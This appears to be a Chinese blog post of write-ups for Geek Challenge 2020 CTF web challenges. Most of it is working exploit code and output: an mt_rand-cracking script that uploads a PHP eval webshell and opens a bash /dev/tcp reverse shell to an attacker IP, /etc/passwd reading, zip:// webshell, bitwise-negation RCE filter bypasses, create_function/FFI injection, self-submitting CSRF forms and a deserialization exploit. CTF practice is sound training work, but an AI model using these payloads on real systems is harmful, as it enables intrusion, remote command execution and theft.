+++
title = "极客大挑战2020"
slug = "geek-challenge-2020"
description = "刷"
date = "2024-08-09T13:34:40"
lastmod = "2024-08-09T13:34:40"
image = ""
license = ""
categories = ["复现"]
tags = []
+++

# [极客大挑战 2020]Cross

先反弹shell

```python
# exp.py
from base64 import b64encode
from os import remove
from subprocess import check_output
from threading import Thread
from time import sleep

import requests

from reverse_mt_rand import main as reverse


def reverse_shell(ip, port):
    print(f"try to reverse {ip}:{port}")
    try:
        requests.post(webshellurl, data={
                        "a": f"""system("bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'");"""})
    except Exception:
        return


# 修改这里
ip = "10.88.15.156"  # 反弹ip
port = "9999"  # 反弹端口
url = "http://0bed0ae6-a488-4324-82d9-a1546c5605db.node5.buuoj.cn:81/front/index.php"
webshellname = "test.php"


#
adminurl = "/".join(url.split("/")[:-2]) + "/admin/index.php"
uploadurl = "/".join(url.split("/")[:-2]) + "/admin/upload.php"
webshellurl = "/".join(url.split("/")[:-2]) + \
    "/upload/" + webshellname + chr(10)

s = requests.Session()

# 获取cookie
s.get(url)
# 获取随机数文件
res = s.post(url, data={"get_code": True, "length": 228})
result = res.json()['content']
numbers = result.split(" ")
# 读取1和228个随机数
a, b = int(numbers[0]), int(numbers[-1])
# 计算seed
seed = reverse(a, b, 0, 0)
print("seed is %d" % seed)
# 获得第301个随机数
code = "<?php mt_srand(%d);for($i=0;$i<300;$i++){$b=mt_rand();}echo mt_rand();" % seed
with open("test.php", "w+") as f:
    f.write(code)
result = int(check_output('php test.php').decode())
remove("test.php")
print("301 number is %d" % result)

# 发送正确答案
res = s.post(url, data={"rand": result})
res.encoding = res.apparent_encoding
print(res.text)
if ("failed" in res.text):
    print("答案错误请重试")
    exit(1)
# 请求后台
cookies = s.cookies.get_dict()
print("cookies:\n", cookies)
# 越权
cookies['Username'] = b64encode("x1hy9".encode()).decode()

# CVE-2017-15715
with open(webshellname, "w+") as f:
    f.write("<?php eval($_POST['a']); ?>")

res = requests.post(uploadurl, data={
                    "name": webshellname + chr(10)}, cookies=cookies, files={"file": ("test.php", open(webshellname, "r"))})
print(res, "\n", res.text)

# 反弹shell
t = Thread(target=reverse_shell, args=(ip, port))
t.setDaemon(True)
t.start()
# 善后
remove("test.php")
print("Ctrl+c to leave")
try:
    while True:
        sleep(60)
except (KeyboardInterrupt, EOFError):
    pass
print("Bye")

```

```python
# reverse_mt_rand.py
# Charles Fol
# @cfreal_
# 2020-01-04 (originally la long time ago ~ 2010)
# Breaking mt_rand() with two output values and no bruteforce.
#
"""
R = final rand value
S = merged state value
s = original state value
"""

import random
import sys

N = 624
M = 397

MAX = 0xffffffff
MOD = MAX + 1

# STATE_MULT * STATE_MULT_INV = 1 (mod MOD)
STATE_MULT = 1812433253
STATE_MULT_INV = 2520285293

MT_RAND_MT19937 = 1
MT_RAND_PHP = 0


def php_mt_initialize(seed):
    """Creates the initial state array from a seed.
    """
    state = [None] * N
    state[0] = seed & 0xffffffff;
    for i in range(1, N):
        r = state[i - 1]
        state[i] = (STATE_MULT * (r ^ (r >> 30)) + i) & MAX
    return state


def undo_php_mt_initialize(s, p):
    """From an initial state value `s` at position `p`, find out seed.
    """
    # We have:
    # state[i] = (1812433253U * ( state[i-1] ^ (state[i-1] >> 30) + i )) % 100000000
    # and:
    # (2520285293 * 1812433253) % 100000000 = 1 (Modular mult. inverse)
    # => 2520285293 * (state[i] - i) = ( state[i-1] ^ (state[i-1] >> 30) ) (mod 100000000)
    for i in range(p, 0, -1):
        s = _undo_php_mt_initialize(s, i)
    return s


def _undo_php_mt_initialize(s, i):
    s = (STATE_MULT_INV * (s - i)) & MAX
    return s ^ s >> 30


def php_mt_rand(s1):
    """Converts a merged state value `s1` into a random value, then sent to the
    user.
    """
    s1 ^= (s1 >> 11)
    s1 ^= (s1 << 7) & 0x9d2c5680
    s1 ^= (s1 << 15) & 0xefc60000
    s1 ^= (s1 >> 18)
    return s1


def undo_php_mt_rand(s1):
    """Retrieves the merged state value from the value sent to the user.
    """
    s1 ^= (s1 >> 18)
    s1 ^= (s1 << 15) & 0xefc60000

    s1 = undo_lshift_xor_mask(s1, 7, 0x9d2c5680)

    s1 ^= s1 >> 11
    s1 ^= s1 >> 22

    return s1


def undo_lshift_xor_mask(v, shift, mask):
    """r s.t. v = r ^ ((r << shift) & mask)
    """
    for i in range(shift, 32, shift):
        v ^= (bits(v, i - shift, shift) & bits(mask, i, shift)) << i
    return v


def bits(v, start, size):
    return lobits(v >> start, size)


def lobits(v, b):
    return v & ((1 << b) - 1)


def bit(v, b):
    return v & (1 << b)


def bv(v, b):
    return bit(v, b) >> b


def php_mt_reload(state, flavour):
    s = state
    for i in range(0, N - M):
        s[i] = _twist_php(s[i + M], s[i], s[i + 1], flavour)
    for i in range(N - M, N - 1):
        s[i] = _twist_php(s[i + M - N], s[i], s[i + 1], flavour)


def _twist_php(m, u, v, flavour):
    """Emulates the `twist` and `twist_php` #defines.
    """
    mask = 0x9908b0df if (u if flavour == MT_RAND_PHP else v) & 1 else 0
    return m ^ (((u & 0x80000000) | (v & 0x7FFFFFFF)) >> 1) ^ mask


def undo_php_mt_reload(S000, S227, offset, flavour):
    # define twist_php(m,u,v)  (m ^ (mixBits(u,v)>>1) ^ ((uint32_t)(-(int32_t)(loBit(u))) & 0x9908b0dfU))
    # m S000
    # u S227
    # v S228
    X = S000 ^ S227

    # This means the mask was applied, and as such that S227's LSB is 1
    s22X_0 = bv(X, 31)
    # remove mask if present
    if s22X_0:
        X ^= 0x9908b0df

    # Another easy guess
    s227_31 = bv(X, 30)
    # remove bit if present
    if s227_31:
        X ^= 1 << 30

    # We're missing bit 0 and bit 31 here, so we have to try every possibility
    s228_1_30 = (X << 1)
    for s228_0 in range(2):
        for s228_31 in range(2):
            if flavour == MT_RAND_MT19937 and s22X_0 != s228_0:
                continue
            s228 = s228_0 | s228_31 << 31 | s228_1_30

            # Check if the results are consistent with the known bits of s227
            s227 = _undo_php_mt_initialize(s228, 228 + offset)
            if flavour == MT_RAND_PHP and bv(s227, 0) != s22X_0:
                continue
            if bv(s227, 31) != s227_31:
                continue

            # Check if the guessed seed yields S000 as its first scrambled state
            rand = undo_php_mt_initialize(s228, 228 + offset)
            state = php_mt_initialize(rand)
            php_mt_reload(state, flavour)

            if not (S000 == state[offset]):
                continue

            return rand
    return None


def main(_R000, _R227, offset, flavour):
    # Both were >> 1, so the leftmost byte is unknown
    _R000 <<= 1
    _R227 <<= 1

    for R000_0 in range(2):
        for R227_0 in range(2):
            R000 = _R000 | R000_0
            R227 = _R227 | R227_0
            S000 = undo_php_mt_rand(R000)
            S227 = undo_php_mt_rand(R227)
            seed = undo_php_mt_reload(S000, S227, offset, flavour)
            if seed:
                return seed


def test_do_undo(do, undo):
    for i in range(10000):
        rand = random.randrange(1, MAX)
        done = do(rand)
        undone = undo(done)
        if not rand == undone:
            print(f"-- {i} ----")
            print(bin(rand).rjust(34))
            print(bin(undone).rjust(34))
            break


def test():
    test_do_undo(
        php_mt_initialize,
        lambda s: undo_php_mt_initialize(s[227], 227)
    )
    test_do_undo(
        php_mt_rand,
        undo_php_mt_rand
    )
    exit()


```

然后执行命令

```
www-data@out:/var/www/html/admin$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
liuzhuang:x:2333:0::/home/liuzhuang:/bin/bash
```

找到`liuzhuang`,并且是可以登录的，找和他相关的文件

```bash
find / -user liuzhuang 2>/dev/null
/home/liuzhuang
/tmp/something/mylog2
/etc/question/misc/mylog1
/usr/liuzhuang/mylog3

base64 /tmp/something/mylog2
base64 /etc/question/misc/mylog1
base64 /usr/liuzhuang/mylog3

script /dev/null
```

挨个看找到了密码

```
3月17日 晴

今天我还是照常给你发消息，汇报日常工作，你终于回了我四个字：“嗯嗯，好的”你开始愿意敷衍我了，我太感动了受宠若惊。我愿意天天给你发消息。就算你天天骂我，我也不觉得烦。

EGG{4ind_L0n91on3_to_get_rew@rd}
3月18日 暴雨转小雨,然后逐渐变晴 云朵好漂亮

刚从派出所出来，原因前几天14号情人节，我想送你礼物，我去偷东西的时候被抓了，我本来想反抗，警察说了一句老实点别动，我立刻就放弃了反抗，因为我记得你说过，你喜欢老实人。


3月19日 阴天

你这几天断断续续给我发很多话，我猜这一定是你对我的试探，在我再一次孜孜不倦的骚扰你的情况下，你终于跟我说了一句最长的话"liuzhuang_wants_a_gf"我又陷入了沉思，这一定有什么含义。我想了很久，你竟然提到了gf 没想到原来你已经想得那么长远了，还想要帮我找个女朋友。原来我在你心中这么重要，我太感动了。真的，那你现在在干嘛，我好想你。
```

找到密码就解决了

# [极客大挑战 2020]Roamphp1-Welcome

进入之后，一直加载不出来，抓包改成`POST`方式发包得到源码

```php
<?php
error_reporting(0);
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
header("HTTP/1.1 405 Method Not Allowed");
exit();
} else {
    
    if (!isset($_POST['roam1']) || !isset($_POST['roam2'])){
        show_source(__FILE__);
    }
    else if ($_POST['roam1'] !== $_POST['roam2'] && sha1($_POST['roam1']) === sha1($_POST['roam2'])){
        phpinfo();  // collect information from phpinfo!
    }
}
```

```
POST:
roam1[]=1&roam2[]=2
```

```
auto_prepend_file : /var/www/html/f1444aagggg.php
```

直接访问并没有发现`flag`，发包看看

```
Resquest:

POST /f1444aagggg.php HTTP/1.1
Host: ff0b9b96-4d7c-4f97-9cfc-d7c88dcae164.node5.buuoj.cn:81
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

```
Response:

HTTP/1.1 404 Not Found
Server: openresty
Date: Fri, 09 Aug 2024 06:11:18 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 195
Connection: close
X-Powered-By: PHP/7.2.25
Flag: SYC{w31c0m3_t0_5yc_r0@m_php1}

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
```

欸但是提交不正确，那么我们回去看看

在`phpinfo`界面找到`flag`

# [极客大挑战 2020]Roamphp2-Myblog

```html
<ul>
            	<li><a href="?page=home">HOME</a></li>
                <li><a href="?page=login">Login</a></li>
                <li><a href="#work">Works</a></li>
            </ul> 
```

尝试文件读取

有效信息应该是就只有这个

```url
http://0a4294ec-8445-4534-99ab-e6f76c3d171f.node5.buuoj.cn:81/index.php?page=php://filter/convert.base64-encode/resource=login
```



```html
<?php
require_once("secret.php");
mt_srand($secret_seed);
$_SESSION['password'] = mt_rand();
?>
```

在源码中还发现了可疑路径

`<form method="post" action="/?page=admin/user" class="form-validate" id="loginFrom">`

继续用`filter`协议读取文件

```php
<?php
error_reporting(0);
session_start();
$logined = false;
if (isset($_POST['username']) and isset($_POST['password'])){
	if ($_POST['username'] === "Longlone" and $_POST['password'] == $_SESSION['password']){  // No one knows my password, including myself
		$logined = true;
		$_SESSION['status'] = $logined;
	}
}
if ($logined === false && !isset($_SESSION['status']) || $_SESSION['status'] !== true){
    echo "<script>alert('username or password not correct!');window.location.href='index.php?page=login';</script>";
	die();
}
?>
```

这里的`password`绕过由于是随机数,碰撞肯定是不可能的,我们直接把`cookie`删了就可以了

弄了半天终于是登录进来了,这里我们并不能直接进,浏览器的🐕设置

```
Response:

POST /?page=admin/user HTTP/1.1
Host: c332dd89-cdc3-4987-83d9-7e06a9a0f049.node5.buuoj.cn:81
Content-Length: 28
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://c332dd89-cdc3-4987-83d9-7e06a9a0f049.node5.buuoj.cn:81
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://c332dd89-cdc3-4987-83d9-7e06a9a0f049.node5.buuoj.cn:81/index.php?page=login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=
Connection: close

username=Longlone&password=
```

然后放包即可登录

先随便上传一个图片

```
Update image -> assets/img/upload/345ddb8470a32bf977524f9a72aa0c7b4f451e68.png
```

上传🐎路径为

```
Update image -> assets/img/upload/368d066d6c9103bba3e2e41338d2cad19e2f367b.jpg
```

```
zip:// + zip路径 + %23 + php文件名 (由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23)
```

但是这里会有一些细节的处理,首先这里不讲解`zip`协议,主要就是这个🐎的产生,首先必须写一个**php文件(内含马)**,其次为了`zip`协议能够正确的解析,我们必须进行压缩,而题目环境作为头像,我们需要进行文件后缀的修改为`jpg`或者其他的图片也行(我没试过,你可以试试)

```
?page=zip://./assets/img/upload/368d066d6c9103bba3e2e41338d2cad19e2f367b.jpg%231

POST :
a=system("tac /f*");
```

# [极客大挑战 2020]Roamphp4-Rceme

正常的RCE应该是有源码的,但是我们这里没有直接给,只是给了第一个验证,MD5

```python
import hashlib

for i in range(1,10000000000000):
    m=hashlib.md5(str(i).encode()).hexdigest()
    if m[0:5]=='8375b':
        print(i)
        break
```

测试了一下`code`是`POST`传参

然后就过了很久,我发现这个MD5,发包一次就会刷新一次也是有点逆天了

```
<!-- Do you know vim swp? -->
```

但是我访问`/.index.php.swp`下载文件

```
vim -r index.php.swp
恢复文件
```

```
<?php
error_reporting(0);
session_start();
if(!isset($_SESSION['code'])){
        $_SESSION['code'] = substr(md5(mt_rand().sha1(mt_rand)),0,5);
}

if(isset($_POST['cmd']) and isset($_POST['code'])){

        if(substr(md5($_POST['code']),0,5) !== $_SESSION['code']){
                die('<script>alert(\'Captcha error~\');history.back()</script>');
        }
        $_SESSION['code'] = substr(md5(mt_rand().sha1(mt_rand)),0,5);
        $code = $_POST['cmd'];
        if(strlen($code) > 70 or preg_match('/[A-Za-z0-9]|\'|"|`|\ |,|\.|-|\+|=|\/|\\|<|>|\$|\?|\^|&|\|/ixm',$code)){
                die('<script>alert(\'Longlone not like you~\');history.back()</script>');
        }else if(';' === preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $code)){
                @eval($code);
                die();
        }
}
?>
```

过滤了很多，但是我们使用取反还是可以绕过的

首先我们从返回包看得出来php版本

```
Response:

HTTP/1.1 200 OK
Server: openresty
Date: Sat, 10 Aug 2024 03:55:59 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 87226
Connection: close
X-Powered-By: PHP/7.2.25
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Cache-Control: no-cache
```

而`php7`的命令对解析方式示例为

```php
phpinfo(): [~%8F%97%8F%96%91%99%90][~%CF]();

%CF和%FF一样的效果,为了满足解析格式而已
```

尝试

```
Request:

POST / HTTP/1.1
Host: 4f3cd3cd-ba8c-41b1-bfdb-db629d982bf4.node5.buuoj.cn:81
Content-Length: 49
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://4f3cd3cd-ba8c-41b1-bfdb-db629d982bf4.node5.buuoj.cn:81
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36;ls
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://4f3cd3cd-ba8c-41b1-bfdb-db629d982bf4.node5.buuoj.cn:81/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=21338fa17a1f919fb434f3da5d39d3b3
Connection: close

cmd=[~%8F%97%8F%96%91%99%90][~%CF]();&code=750173
```

但是这其中的奥妙我尝试了很久,首先就是`code`,`code`的前五位其实是由`cookie`来定的,众所周知,`MD5`可以多个值对应一个`MD5`所以这个`code`也会一直变,所以发包的时候也是需要注意`cookie`的变化来改包,回显确实为`phpinfo()`的内容

这是我写的EXP

```php
<?php
$a=urlencode(~'var_dump');
echo "[$a]"."[~%FF]";
echo "\n";
$b=urlencode(~'getenv');
echo "[$b]"."[~%FF]";
echo "\n";
$c=urlencode(~'phpinfo');
echo "[$c]"."[~%FF]";

?>
```

凑合能用，当然还是官方的好些

```python
def one(s):
    ss = ""
    for each in s:
        ss += "%" + str(hex(255 - ord(each)))[2:].upper()
    return f"[~{ss}][!%FF]("

while 1:
    a = input(":>").strip(")")
    aa = a.split("(")
    s = ""
    for each in aa[:-1]:
        s += one(each)
    s += ")" * (len(aa) - 1) + ";"
    print(s)
```

生成`payload`的脚本

```
var_dump(getallheaders());
查看header的位置
[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]());
```

```
Response:

HTTP/1.1 200 OK
Server: openresty
Date: Sat, 10 Aug 2024 04:56:09 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 1437
Connection: close
X-Powered-By: PHP/7.2.25
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Cache-Control: no-cache

array(22) {
  ["Host"]=>
  string(51) "554fed34-d84c-432a-b0af-0d475ffbbeb8.node5.buuoj.cn"
  ["X-Request-ID"]=>
  string(32) "7902946605375aba0b94d347c61e44b9"
  ["X-Real-IP"]=>
  string(15) "171.218.198.228"
  ["X-Forwarded-For"]=>
  string(31) "171.218.198.228, 192.168.122.14"
  ["X-Forwarded-Host"]=>
  string(51) "554fed34-d84c-432a-b0af-0d475ffbbeb8.node5.buuoj.cn"
  ["X-Forwarded-Port"]=>
  string(2) "80"
  ["X-Forwarded-Proto"]=>
  string(4) "http"
  ["X-Forwarded-Scheme"]=>
  string(4) "http"
  ["X-Scheme"]=>
  string(4) "http"
  ["X-Original-Forwarded-For"]=>
  string(15) "171.218.198.228"
  ["Content-Length"]=>
  string(3) "101"
  ["REMOTE-HOST"]=>
  string(15) "171.218.198.228"
  ["User-Agent"]=>
  string(4) "ls /"
  ["Cache-Control"]=>
  string(9) "max-age=0"
  ["Upgrade-Insecure-Requests"]=>
  string(1) "1"
  ["Origin"]=>
  string(61) "http://554fed34-d84c-432a-b0af-0d475ffbbeb8.node5.buuoj.cn:81"
  ["Content-Type"]=>
  string(33) "application/x-www-form-urlencoded"
  ["Accept"]=>
  string(135) "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
  ["Referer"]=>
  string(62) "http://554fed34-d84c-432a-b0af-0d475ffbbeb8.node5.buuoj.cn:81/"
  ["Accept-Encoding"]=>
  string(13) "gzip, deflate"
  ["Accept-Language"]=>
  string(14) "zh-CN,zh;q=0.9"
  ["Cookie"]=>
  string(42) "PHPSESSID=ac878c03619017c4daa300690c23475a"
}
```

bushi,网上的都是直接就可控UA,直接就拿下了,到我这里我控牛魔

思路是对的,就不浪费时间了,前面七七八八的起码两个小时了这道题艹艹艹,服了

# [极客大挑战 2020]Roamphp5-FighterFightsInvincibly

## 无法出网的FFI

这个知识点另外开一篇文章讲

```html
<!-- $_REQUEST['fighter']($_REQUEST['fights'],$_REQUEST['invincibly']); -->
```

就只有这一行代码

这里我们可以`create_function`代码注入

```python
import requests

url = "http://4da6ae72-d1a3-42cd-a910-6bafa05dadde.node5.buuoj.cn:81/"

# data = {"fighter": "create_function", "fights": "", "invincibly": """}$e=FFI::cdef("void *popen(char*,char*);\\nvoid pclose(void*);\\nint fgetc(void*);","libc.so.6");$o = $e->popen($_REQUEST['cmd'],"r");$d="";while(($c=$e->fgetc($o))!=-1){$d.=str_pad(strval(dechex($c)),2,"0",0);}$e->pclose($o);echo hex2bin($d);/*"""}
data = {"fighter": "create_function", "fights": "", "invincibly": """}$e=FFI::cdef("int php_exec(int type, char *cmd);");$e->php_exec(3,$_REQUEST['cmd']);/*"""}

while 1:
    cmd = input("cmd:>")
    res = requests.post(url, data=data, params={"cmd": cmd})
    result = res.text.split("-->")[1]
    print(result)
```

这个脚本分两种方式进行getshell但是环境貌似有问题，明明flag少了五位，就是不出来，难不成其中还有爆破的成分？

```
第一种是使用c里的popen,然后从管道中读取结果

第二种是FFI中可以直接调用php源码中的函数,php_exec的type为3时对应的是passthru
```

# [极客大挑战 2020]Roamphp6-flagshop

一个`csrf`漏洞，依靠后台点击获取马内,emm也就是钓鱼

buu上面的容器过期了，那我们自己搭建一个吧，顺手的事情

先是找到一个上传报告的地方，然后发现可以上传，但是需要我们一个验证码

```python
import hashlib
import random
import string
strr = "48473"
while True:
    # string.ascii_letters是所有大小写字母,string.digits是所有数字
    dic = ''.join(random.sample(string.ascii_letters + string.digits, 5))
    md = hashlib.md5(dic.encode("utf-8")).hexdigest()
    if md[:5] == strr:
        print(dic)
        break

```

然后转账界面进行抓包利用`bp`打出`csrf`的`poc`并且进行一点点的改动

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://173.82.206.142:8005/transfer.php" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="target" value="qwasd" />
      <input type="hidden" name="money" value="1000000000000000000000000000000000000000000000000000000" />
      <input type="hidden" name="messages" value="123" />
      <input type="submit" value="Submit request" id="onclick_1" />
    </form>
    <script type="text/javascript">
      document.getElementById("onclick_1").click();
    </script>
  </body>
</html>
```

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://5542a522-d42b-45f5-a55b-0cb2caf84f34.node4.buuoj.cn:81/transfer.php" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="target" value="a" />
      <input type="hidden" name="money" value="10000000000" />
      <input type="hidden" name="messages" value="test" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

这两个EXP都可以,然后建立一个`index.html`放在`vps`

```
报告主题:bug
验证码:自己的
报告内容:http://ip:12138/index.html
```

然后马内就会到账了

# [极客大挑战 2020]Greatphp

```php
<?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }
           
        }
    }
}

if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}

?>
```

一个反序列化，其中的绕过如果是在RCE中非常简单，但是现在在类中属性，思考一下

我们能否将两个属性地址指向同一个地方呢，但是要执行命令

**这里我们可以使用原生类Error或者Exception，只不过 Exception 类适用于PHP 5和7，而 Error 只适用于 PHP 7。**

```php
<?php
$str='baozongwi';
$a=new Error($str,1);
$b=new Error($str,1);

echo $a;
echo $b;
// Error: baozongwi in C:\Users\baozhongqi\Documents\VSCODE\php\index.php:3
// Stack trace:
// #0 {main}Error: baozongwi in C:\Users\baozhongqi\Documents\VSCODE\php\index.php:4
// Stack trace:
// #0 {main}
?>
```

```php
<?php
$str='baozongwi';
$a=new Error($str,1);$b=new Error($str,3);
if( ($a != $b) && (md5($a) === md5($b)) && (sha1($a)=== sha1($b)) ){
    echo 1;
}
// echo $a;
// echo $b;

// 1Error: baozongwi in C:\Users\baozhongqi\Documents\VSCODE\php\index.php:3
// Stack trace:
// #0 {main}Error: baozongwi in C:\Users\baozhongqi\Documents\VSCODE\php\index.php:3
// Stack trace:
// #0 {main}
?>
```

分析得到我们要让可以绕过必须得在同一行写

欧克那写个EXP

```php
<?php
echo urlencode(~'/flag');
?>
```

生成flag之后我们取反绕过

```php
<?php
class SYCLOVER {
    public $syc;
    public $lover;

}
$str="?><?=include~".urldecode("%d0%99%93%9e%98")."?><?";
$a=new Error($str,1);$b=new Error($str,2);
$c=new SYCLOVER();
$c->syc = $a;
$c->lover = $b;
echo urlencode(serialize($c));
?>
```

传参即可
